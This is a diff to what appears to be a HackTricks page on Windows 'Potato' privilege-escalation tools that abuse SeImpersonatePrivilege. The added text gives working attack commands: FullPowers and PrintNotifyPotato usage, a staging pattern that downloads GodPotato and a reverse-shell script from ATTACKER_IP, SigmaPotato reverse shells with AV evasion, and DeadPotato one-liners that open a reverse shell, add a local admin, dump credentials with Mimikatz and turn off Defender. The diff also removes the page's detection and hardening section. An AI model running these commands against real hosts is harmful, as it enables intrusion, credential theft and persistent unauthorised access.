@@ -37,10 +37,12 @@ whoami /priv | findstr /i impersonate
 
 Operational notes:
 
+- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
 - PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
 - RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
 - EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
 - Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
+- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.
 
 ## Quick Demo
 
@@ -82,6 +84,25 @@ socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 # On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
 RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
+
+### PrintNotifyPotato
+
+PrintNotifyPotato is a newer COM abuse primitive released in late 2022 that targets the **PrintNotify** service instead of Spooler/BITS. The binary instantiates the PrintNotify COM server, swaps in a fake `IUnknown`, then triggers a privileged callback through `CreatePointerMoniker`. When the PrintNotify service (running as **SYSTEM**) connects back, the process duplicates the returned token and spawns the supplied payload with full privileges.
+
+Key operational notes:
+
+* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
+* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
+* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:
+
+  ```cmd
+  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
+  PrintNotifyPotato.exe whoami
+  ```
+
+* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.
+
+Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.
 
 ### SharpEfsPotato
 
@@ -140,6 +161,16 @@ EfsPotato <cmd> [pipe]
 
 Notes:
 - Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
+- Grab the binary that matches the installed runtime (e.g., `GodPotato-NET4.exe` on modern Server 2022).
+- If your initial execution primitive is a webshell/UI with short timeouts, stage the payload as a script and ask GodPotato to run it instead of a long inline command.
+
+Quick staging pattern from a writable IIS webroot:
+
+```powershell
+iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
+iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
+./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
+```
 
 ### DCOMPotato
 
@@ -168,13 +199,38 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
 
-## Detection and hardening notes
+Additional perks in 2024–2025 builds (v1.2.x):
+- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
+- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
+- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.
 
-- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
-- Spooler hardening: Disabling the Print Spooler service on servers where it isn’t needed prevents PrintSpoofer-style local coercions via spoolss.
-- Service account hardening: Minimize assignment of SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege to custom services. Consider running services under virtual accounts with least privileges required and isolating them with service SID and write-restricted tokens when possible.
-- Network controls: Blocking outbound TCP/135 or restricting RPC endpoint mapper traffic can break RoguePotato unless an internal redirector is available.
-- EDR/AV: All of these tools are widely signatured. Recompiling from source, renaming symbols/strings, or using in-memory execution can reduce detection but won’t defeat solid behavioral detections.
+### DeadPotato (2024 GodPotato rework with modules)
+
+DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.
+
+Common modules (all require SeImpersonatePrivilege):
+
+- `-cmd "<cmd>"` — spawn arbitrary command as SYSTEM.
+- `-rev <ip:port>` — quick reverse shell.
+- `-newadmin user:pass` — create a local admin for persistence.
+- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (touches disk, noisy).
+- `-sharphound` — run SharpHound collection as SYSTEM.
+- `-defender off` — flip Defender real-time protection (very noisy).
+
+Example one-liners:
+
+```cmd
+# Blind reverse shell
+DeadPotato.exe -rev 10.10.14.7:4444
+
+# Drop an admin for later login
+DeadPotato.exe -newadmin pwned:P@ssw0rd!
+
+# Run SharpHound immediately after priv-esc
+DeadPotato.exe -sharphound
+```
+
+Because it ships extra binaries, expect higher AV/EDR flags; use the slimmer GodPotato/SigmaPotato when stealth matters.
 
 ## References
 
@@ -187,5 +243,11 @@ SigmaPotato adds modern niceties like in-memory execution via .NET reflection an
 - [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 - [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
+- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)
 
 {{#include ../../banners/hacktricks-training.md}}
